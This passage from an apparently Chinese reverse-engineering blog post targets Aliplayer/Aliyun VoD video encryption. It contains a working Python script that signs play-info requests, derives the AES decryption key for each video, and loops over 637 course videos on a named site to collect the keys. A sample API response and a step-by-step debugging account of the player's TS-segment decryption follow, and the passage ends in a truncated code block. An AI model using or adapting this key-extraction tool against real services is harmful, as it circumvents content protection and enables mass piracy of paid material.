class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        playauth = json.loads(b64playauth.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        playauth[<span class="string">&quot;AuthInfo&quot;</span>] = json.loads(playauth[<span class="string">&quot;AuthInfo&quot;</span>])</span><br><span class="line">        st = <span class="string">&#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz234567890&#x27;</span></span><br><span class="line">        randstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            randstr += st[math.floor(random.random() * <span class="number">50</span>)]</span><br><span class="line"></span><br><span class="line">        message = randstr.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        key = RSA.import_key(<span class="built_in">open</span>(<span class="string">&quot;rand.pem&quot;</span>).read())</span><br><span class="line">        cipher = PKCS1_v1_5.new(key)</span><br><span class="line">        ciphertext = cipher.encrypt(message)</span><br><span class="line">        rand = b64encode(ciphertext)</span><br><span class="line">        rand = rand.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        reqdict = &#123;&#125;</span><br><span class="line">        reqdict[<span class="string">&quot;AccessKeyId&quot;</span>] = playauth[<span class="string">&quot;AccessKeyId&quot;</span>]</span><br><span class="line">        reqdict[<span class="string">&quot;Action&quot;</span>] = <span class="string">&quot;GetPlayInfo&quot;</span></span><br><span class="line">        playauth[<span class="string">&quot;AuthInfo&quot;</span>] = json.loads(b64playauth.decode(<span class="string">&#x27;utf8&#x27;</span>))[<span class="string">&quot;AuthInfo&quot;</span>]</span><br><span class="line">        reqdict[<span class="string">&quot;AuthInfo&quot;</span>] = urllib.parse.quote_plus(playauth[<span class="string">&quot;AuthInfo&quot;</span>])</span><br><span class="line">        reqdict[<span class="string">&quot;AuthTimeout&quot;</span>] = <span class="number">7200</span></span><br><span class="line">        reqdict[<span class="string">&quot;Channel&quot;</span>] = <span class="string">&quot;HTML5&quot;</span></span><br><span class="line">        reqdict[<span class="string">&quot;Format&quot;</span>] = <span class="string">&quot;JSON&quot;</span></span><br><span class="line">        reqdict[<span class="string">&quot;Formats&quot;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line">        reqdict[<span class="string">&quot;PlayConfig&quot;</span>] = urllib.parse.quote_plus(<span class="string">&#x27;&#123;&quot;PreviewTime&quot;:18000&#125;&#x27;</span>)</span><br><span class="line">        reqdict[<span class="string">&quot;PlayerVersion&quot;</span>] = <span class="string">&quot;2.9.7&quot;</span></span><br><span class="line">        reqdict[<span class="string">&quot;Rand&quot;</span>] = urllib.parse.quote_plus(rand)</span><br><span class="line">        reqdict[<span class="string">&quot;ReAuthInfo&quot;</span>] = urllib.parse.quote_plus(<span class="string">&#x27;&#123;&#125;&#x27;</span>)</span><br><span class="line">        reqdict[<span class="string">&quot;SecurityToken&quot;</span>] = urllib.parse.quote_plus(playauth[<span class="string">&quot;SecurityToken&quot;</span>])</span><br><span class="line">        reqdict[<span class="string">&quot;SignatureMethod&quot;</span>] = <span class="string">&quot;HMAC-SHA1&quot;</span></span><br><span class="line">        reqdict[<span class="string">&quot;SignatureNonce&quot;</span>] = uuid.uuid4()</span><br><span class="line">        reqdict[<span class="string">&quot;SignatureVersion&quot;</span>] = <span class="number">1.0</span></span><br><span class="line">        reqdict[<span class="string">&quot;StreamType&quot;</span>] = <span class="string">&quot;video&quot;</span></span><br><span class="line">        reqdict[<span class="string">&quot;Version&quot;</span>] = <span class="string">&quot;2017-03-21&quot;</span></span><br><span class="line">        reqdict[<span class="string">&quot;VideoId&quot;</span>] = json.loads(playauth[<span class="string">&quot;AuthInfo&quot;</span>])[<span class="string">&quot;MediaId&quot;</span>]</span><br><span class="line"></span><br><span class="line">        e = <span class="string">&#x27;GET&amp;%2F&amp;&#x27;</span> + urllib.parse.urlencode(reqdict).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;%3D&#x27;</span>).replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;%26&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        key1 = <span class="built_in">bytes</span>(playauth[<span class="string">&quot;AccessKeySecret&quot;</span>] + <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">        message1 = <span class="built_in">bytes</span>(e, <span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        digester = hmac.new(key1, message1, hashlib.sha1)</span><br><span class="line">        signature1 = digester.digest()</span><br><span class="line">        signature = <span class="built_in">str</span>(base64.b64encode(signature1), <span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        reqdict[<span class="string">&quot;Signature&quot;</span>] = urllib.parse.quote_plus(signature)</span><br><span class="line"></span><br><span class="line">        requrl = <span class="string">&#x27;https://vod.&#x27;</span> + playauth[<span class="string">&quot;Region&quot;</span>] + <span class="string">&#x27;.aliyuncs.com/?&#x27;</span> + urllib.parse.urlencode(reqdict) </span><br><span class="line">            .replace(<span class="string">&#x27;%25&#x27;</span>, <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        aliheaders = &#123;<span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>, <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Chromium&quot;;v=&quot;92&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;92&quot;&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                                    <span class="string">&#x27;Chrome/92.0.4515.131 Safari/537.36&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;cross-site&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>, <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>, <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>, <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>&#125;</span><br><span class="line">        parseurl = urllib.parse.urlparse(customurl)</span><br><span class="line">        aliheaders[<span class="string">&#x27;Origin&#x27;</span>] = aliheaders[<span class="string">&#x27;Referer&#x27;</span>] = parseurl.scheme + <span class="string">&#x27;://&#x27;</span> + parseurl.netloc</span><br><span class="line">        req = requests.get(requrl, headers=aliheaders)</span><br><span class="line"></span><br><span class="line">        aliresp = req.text</span><br><span class="line">        aliresp = json.loads(aliresp)</span><br><span class="line">        videoinfo = aliresp[<span class="string">&#x27;PlayInfoList&#x27;</span>][<span class="string">&#x27;PlayInfo&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        data[<span class="string">&quot;origin&quot;</span>] = aliresp[<span class="string">&quot;VideoBase&quot;</span>][<span class="string">&quot;Title&quot;</span>]</span><br><span class="line">        data[<span class="string">&quot;CoverUrl&quot;</span>] = aliresp[<span class="string">&quot;VideoBase&quot;</span>][<span class="string">&quot;CoverURL&quot;</span>]</span><br><span class="line">        data[<span class="string">&#x27;Videoinfo&#x27;</span>] = videoinfo</span><br><span class="line"></span><br><span class="line">        randkey = hashlib.md5()</span><br><span class="line">        randkey.update(<span class="built_in">bytes</span>(randstr, <span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">        iv = <span class="built_in">bytes</span>(randkey.hexdigest()[<span class="number">8</span>:<span class="number">24</span>], <span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> videoinfo[<span class="string">&#x27;Encrypt&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> videoinfo[<span class="string">&#x27;EncryptType&#x27;</span>] == <span class="string">&#x27;AliyunVoDEncryption&#x27;</span>:</span><br><span class="line">            randnum = AES.new(iv, AES.MODE_CBC, iv=iv).decrypt(</span><br><span class="line">                b64decode(<span class="built_in">bytes</span>(videoinfo[<span class="string">&#x27;Rand&#x27;</span>], <span class="string">&#x27;utf8&#x27;</span>))).rstrip(<span class="string">b&#x27;\x0c&#x27;</span>).rstrip(<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">            rand = <span class="built_in">bytes</span>(randstr, <span class="string">&#x27;utf8&#x27;</span>) + randnum</span><br><span class="line">            m = hashlib.md5()</span><br><span class="line">            m.update(rand)</span><br><span class="line">            key = <span class="built_in">bytes</span>(m.hexdigest()[<span class="number">8</span>:<span class="number">24</span>], <span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            finalkey = AES.new(key, AES.MODE_CBC, iv=iv).decrypt(</span><br><span class="line">                b64decode(<span class="built_in">bytes</span>(videoinfo[<span class="string">&#x27;Plaintext&#x27;</span>], <span class="string">&#x27;utf8&#x27;</span>))).rstrip(<span class="string">b&#x27;\x08&#x27;</span>)</span><br><span class="line">            data[<span class="string">&#x27;Key&#x27;</span>] = b64encode(finalkey).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    db[num] = data</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">baseurl = <span class="string">r&#x27;https://www.ttgame.net/course/video/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">638</span>):</span><br><span class="line">    allinone(baseurl + <span class="built_in">str</span>(i), <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">datajson = json.dumps(db)</span><br><span class="line"><span class="built_in">print</span>(db)</span><br><span class="line">json.dump(datajson, file)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h2 id="请求返回"><a href="#请求返回" class="headerlink" title="请求返回"></a>请求返回</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;VideoBase&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Status&quot;</span>: <span class="string">&quot;Normal&quot;</span>,</span><br><span class="line">        <span class="string">&quot;VideoId&quot;</span>: <span class="string">&quot;e3d536a098784c0fa612815d816ac9ae&quot;</span>,</span><br><span class="line">        <span class="string">&quot;TranscodeMode&quot;</span>: <span class="string">&quot;FastTranscode&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CreationTime&quot;</span>: <span class="string">&quot;2020-01-20T01:59:29Z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Title&quot;</span>: <span class="string">&quot;GOM_JS_01_DBC2000.mp4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;MediaType&quot;</span>: <span class="string">&quot;video&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CoverURL&quot;</span>: <span class="string">&quot;https://video.87fun.com/e3d536a098784c0fa612815d816ac9ae/snapshots/b114172681bb4d31ad9544c19eae9a33-00005.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Duration&quot;</span>: <span class="string">&quot;289.066&quot;</span>,</span><br><span class="line">        <span class="string">&quot;OutputType&quot;</span>: <span class="string">&quot;cdn&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;RequestId&quot;</span>: <span class="string">&quot;3E7A2C63-C9D7-5C78-9C38-618FCC8491D3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PlayInfoList&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;PlayInfo&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Status&quot;</span>: <span class="string">&quot;Normal&quot;</span>,</span><br><span class="line">                <span class="string">&quot;StreamType&quot;</span>: <span class="string">&quot;video&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Rand&quot;</span>: <span class="string">&quot;hxg2Eg/z0dNXXOnkBm/6er7RJArXR2Ev/j1s8tHtK2A=&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Size&quot;</span>: <span class="number">16558852</span>,</span><br><span class="line">                <span class="string">&quot;Definition&quot;</span>: <span class="string">&quot;OD&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Fps&quot;</span>: <span class="string">&quot;30&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Duration&quot;</span>: <span class="string">&quot;289.0565&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ModificationTime&quot;</span>: <span class="string">&quot;2020-01-20T01:59:41Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Specification&quot;</span>: <span class="string">&quot;Segmentation&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Bitrate&quot;</span>: <span class="string">&quot;458.286&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Encrypt&quot;</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">&quot;PreprocessStatus&quot;</span>: <span class="string">&quot;UnPreprocess&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Format&quot;</span>: <span class="string">&quot;m3u8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;EncryptType&quot;</span>: <span class="string">&quot;AliyunVoDEncryption&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PlayURL&quot;</span>: <span class="string">&quot;https://video.87fun.com/e3d536a098784c0fa612815d816ac9ae/be5d488683d445898197978de4a69cf5-3f67ac71ee44d93c9b0aa1318b691264-od-S00000001-100000-encrypt-stream.m3u8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;NarrowBandType&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Plaintext&quot;</span>: <span class="string">&quot;Is5rfIvn2me+mc0V6E7ygYtwDvhoD3kt1q/IXFwy698=&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CreationTime&quot;</span>: <span class="string">&quot;2020-01-20T01:59:35Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Height&quot;</span>: <span class="number">720</span>,</span><br><span class="line">                <span class="string">&quot;Width&quot;</span>: <span class="number">1280</span>,</span><br><span class="line">                <span class="string">&quot;JobId&quot;</span>: <span class="string">&quot;026ebcdb3d4348c0868fadbbee9d6cd4&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有想要的一切。</p><hr><h1 id="ts-文件是如何解密的？"><a href="#ts-文件是如何解密的？" class="headerlink" title="ts 文件是如何解密的？"></a>ts 文件是如何解密的？</h1><h2 id="key-对吗？"><a href="#key-对吗？" class="headerlink" title="key 对吗？"></a>key 对吗？</h2><p>下面要做的，首先判断得到的 key，可用于解密的 key 是否一致。<br>在 <code>this.callbacks.onSuccess(h, i, a, e)</code> 下断并当请求的为 <code>ts</code> 文件时 F11 进入。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_234109.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_234109.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_234109.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div> <p>再 F11: </p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_234129.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_234129.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_234129.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>再 F11:</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_234305.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_234305.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_234305.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>注意，这里 c 中包含7个函数，所以会调用7次：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_234325.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_234325.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_234325.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>这是一个事件响应，里面做的事情很多，当执行到第5个函数的时候，进入了<br>blob： <div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_234636.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_234636.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_234636.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div></p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_234706.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_234706.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_234706.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>至于这些函数做了什么事情，大概是对 ts 文件做了一些预处理，但文件的内容没有任何更改，具体的解密操作需要到 blob 中。<br>而对音视频文件的 decode 也在 blob 中。<br>下面对进入 blob 的入口位置加入断点，F11 直接进入：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-13_000532.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-13_000532.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-13_000532.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>条件不满足，执行 else:</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-13_000711.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-13_000711.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-13_000711.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>当跟到下面的时候就可以确定，确实是用这个 key 解密了：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-13_001232.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-13_001232.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-13_001232.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h2 id="ts-解密流程"><a href="#ts-解密流程" class="headerlink" title="ts 解密流程"></a>ts 解密流程</h2><p>先来分析一下 ts 的文件结构，因为这部分有点跑题，所以另起一篇。<br>在上上图中函数的执行过程中，执行到最后一段，这是一段准备解密环境的内容：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-13_134416.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-13_134416.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-13_134416.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>其中最后一行 F11 进入：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-13_134506.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-13_134506.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-13_134506.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>这就是 ts 文件的解密方式的关键函数了。经过大概两三天的分析 ts 文件，终于搞明白了，然后模仿着写了一段解密代码。下面总结一下流程</p><ol><li>一上来先 parse 了很多变量，主要是各种 pid，包括视频、音频、PMT 等</li><li>然后开始循环，每次处理 0xbc 长度的内容，并且对每种数据类型都有一个数组，保存着需要解密的内容</li><li>在每次循环开始的时候，首先取出 payload 位，以后每次遇到 payload 都要执行解密并初始化解密函数</li><li>有 adaptation_field 的时候，跳过 adaptation_field，不存储到需要解密数组中</li><li>如果没有遇到 payload，就一直往各自类型的数组里面存储内容</li><li>当遇到 payload &#x3D;&#x3D; 0x1，把需要解密数组的内容先做 parsePES，然后去掉 pes header，剩下的部分解密</li><li>当数据 % 16 !&#x3D; 0 时，去掉余数，然后保存到数组的对应位置，重置解密函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span 